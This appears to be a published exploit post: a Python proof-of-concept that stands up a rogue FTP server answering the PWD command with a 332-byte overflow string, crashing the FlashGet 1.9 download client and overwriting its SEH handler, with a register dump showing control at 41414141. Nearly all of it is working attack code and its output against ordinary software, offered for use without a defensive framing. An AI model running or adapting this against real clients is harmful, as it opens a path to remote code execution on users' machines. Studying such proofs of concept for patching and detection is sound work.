FlashGet 1.9 (FTP PWD Response) Remote BOF Exploit PoC 0day
===========================================================





#!/usr/bin/python
# FlashGet 1.9 (FTP PWD Response) 0day Remote Buffer Overflow PoC Exploit
# Bug discovered by Krystian Kloskowski (h07) <h07@interia.pl>
# Testen on: FlashGet 1.9 / XP SP2 Polish
# Product URL: http://www.flashget.com/en/download.htm?uid=undefined
# Details:..
#
# 257 "[AAAA..332]/" is current directory.\r\n <-- overflow
#
# 41414141  Pointer to next SEH record
# 41414141  SE handler
#
# ----------------------------------------------------------------
# Exception C0000005 (ACCESS_VIOLATION reading [41414141])
# ----------------------------------------------------------------
# EAX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
# EBX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
# ECX=41414141: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
# EDX=7C9037D8: 8B 4C 24 04 F7 41 04 06-00 00 00 B8 01 00 00 00
# ESP=020D1260: BF 37 90 7C 48 13 0D 02-08 FF 1C 02 64 13 0D 02
# EBP=020D1280: 30 13 0D 02 8B 37 90 7C-48 13 0D 02 08 FF 1C 02
# ESI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
# EDI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
# EIP=41414141: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
#               --> N/A
# ----------------------------------------------------------------
# Just for fun ;]
##

from time import sleep
from socket import *

res = [
    &#039;220 WELCOME!! :x\r\n&#039;,
    &#039;331 Password required for %s.\r\n&#039;,
    &#039;230 User %s logged in.\r\n&#039;,
    &#039;250 CWD command successful.\r\n&#039;,
    &#039;257 "%s/" is current directory.\r\n&#039; # <-- %s B0f :x
    ]

buf = &#039;A&#039; * 332

s = socket(AF_INET, SOCK_STREAM)
s.bind((&#039;0.0.0.0&#039;, 21))
s.listen(1)
print &#039;[+] listening on [FTP] 21 ...\n&#039;
c, addr = s.accept()
c.send(res[0])

user = &#039;&#039;

for i in range(1, len(res)):
    req = c.recv(1024)
    print &#039;[*][CLIENT] %s&#039; % (req)
    tmp = res[i]
    if(req.find(&#039;USER&#039;) != -1):
        req = req.replace(&#039;\r\n&#039;, &#039;&#039;)
        user = req.split(&#039;\x20&#039;, 1)[1]
        tmp %= user
    if(req.find(&#039;PASS&#039;) != -1):
        tmp %= user
    if(req.find(&#039;PWD&#039;) != -1):
        tmp %= buf    
    print &#039;[*][SERVER] %s&#039; % (tmp)    
    c.send(tmp)

sleep(5)
c.close()
s.close()

print &#039;[+] DONE&#039;

# EoF



